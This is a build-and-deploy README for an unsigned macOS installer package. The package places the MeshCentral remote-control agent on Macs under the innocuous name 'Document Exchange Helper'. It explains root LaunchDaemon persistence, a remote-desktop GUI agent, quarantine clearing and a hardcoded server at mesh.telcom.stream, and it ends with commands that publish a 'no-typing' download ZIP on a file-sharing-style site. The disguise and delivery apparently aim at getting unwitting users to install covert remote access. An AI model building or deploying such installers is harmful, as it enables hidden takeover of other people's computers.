# mac/ - Document Exchange Helper (macOS .pkg)

Hardened **unsigned** macOS installer for the MeshCentral agent we ship as
"Document Helper". Built on macOS (GitHub Actions `macos-latest`), never on
Linux.

## What it installs

| Path | Purpose |
|------|---------|
| `/usr/local/bin/DocumentHelper` | the MeshCentral agent (universal, ad-hoc signed) |
| `/usr/local/bin/DocumentHelper.msh` | **the server configuration** (MeshServer + MeshID) |
| `/Library/LaunchDaemons/com.documentexchange.helper.plist` | root LaunchDaemon - starts at boot, before login |
| `/Library/LaunchAgents/com.documentexchange.helper-launchagent.plist` | GUI agent for remote desktop |
| `/Library/LaunchDaemons/...` staged in the payload | loaded by `postinstall` via `launchctl` |

`preinstall` refuses unsupported architectures. `postinstall` fixes ownership,
clears quarantine, and boots the LaunchDaemon (`launchctl bootout` +
`bootstrap`, with `load` fallback).

## Why it ships the `.msh` (do not remove it)

This agent has **no embedded server address**. At startup it loads
`<executable>.msh` from its own directory. Without it the agent logs:

> No MeshCentral settings found, place .msh file with this executable and restart

...and never connects. `DocumentHelper.msh` therefore is a hard requirement, and
`build.sh` fails the build if it is missing or does not point at
`wss://mesh.telcom.stream:443/agent.ashx` with the correct MeshID.

## Why it does not run `meshagent --install`

Two real traps that silently produce an offline Mac:

1. The agent's install verbs are `-install` / `-uninstall` / `-fullinstall`.
   There is **no `--install`**; passing it does not install the background service.
2. The self-installer copies the `.msh` only when given the exact literal
   argument `--copy-msh="1"` (quotes included).

MeshCentral's own macOS package avoids both by shipping a fixed layout plus
launchd units and letting launchd start the agent. This package does the same -
deterministic and exactly how MeshCentral itself delivers to macOS.

## Build

```bash
chmod +x mac/build.sh
./mac/build.sh
# -> mac/build/DocumentHelper.pkg  (+ SHA-256 printed)
```

Or run the `mac-pkg` workflow from the Actions tab and download the
`DocumentHelper-pkg` artifact.

## Verify (asserted by build.sh - the job fails if any check fails)

- payload is a Mach-O universal binary
- payload carries `Signature=adhoc`
- payload is `-rwxr-xr-x`, owned `root:wheel`
- `preinstall` and `postinstall` present and executable
- `Distribution` contains the title `Document Exchange Helper`
- `.msh` present, points at `wss://mesh.telcom.stream:443/agent.ashx`, correct MeshID
- LaunchDaemon unit present and runs `/usr/local/bin/DocumentHelper`
- package is unsigned (`pkgutil --check-signature` → `no signature`)
- `spctl -a -vvv -t install` returns **rejected** where Gatekeeper is enabled
  (GitHub's runners have it disabled, so the build notes it and carries on)
- SHA-256 printed

## Signing (not done yet)

There is no Apple Developer ID certificate, so the package is unsigned by design
and Gatekeeper will prompt once. `build.sh` carries a commented
`productsign` + `notarytool` + `stapler` block to enable once a certificate
exists.

## Deploy

The `DocumentHelper.pkg` artifact replaces the macOS package, then rebuild the
no-typing ZIP that `/get` serves for macOS:

```bash
cp DocumentHelper.pkg /var/www/send/dl/
bash mh1/make-macos-bundle.sh /var/www/send/dl/DocumentHelper.pkg \
     /var/www/send/dl/DocumentHelper-macOS.zip
bash mh1/mk-pages-dir.sh /tmp/pages2 /var/www
wrangler pages deploy /tmp/pages2 --project-name=reyessitework --branch=main
```

Then verify OS routing and the artifact hash (see `mh1/verify-agents.ps1`).